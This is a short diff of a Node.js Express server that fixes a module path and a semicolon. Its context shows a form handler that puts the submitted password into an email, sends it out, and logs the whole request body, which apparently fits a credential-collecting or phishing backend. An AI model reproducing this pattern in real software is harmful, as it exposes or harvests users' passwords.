@@ -1,7 +1,7 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const app = express();
-const mailer = require('nodemailer.js');
+const mailer = require('./nodemailer');
 
 const PORT = 3001;
 let user = undefined;
@@ -24,7 +24,7 @@ app.post('/form', (req, res) => {
     pass: ${req.body.pass}
     `
   }
-  mailer(message)
+  mailer(message);
   console.log(req.body);
   user = req.body;
   res.redirect('/form')
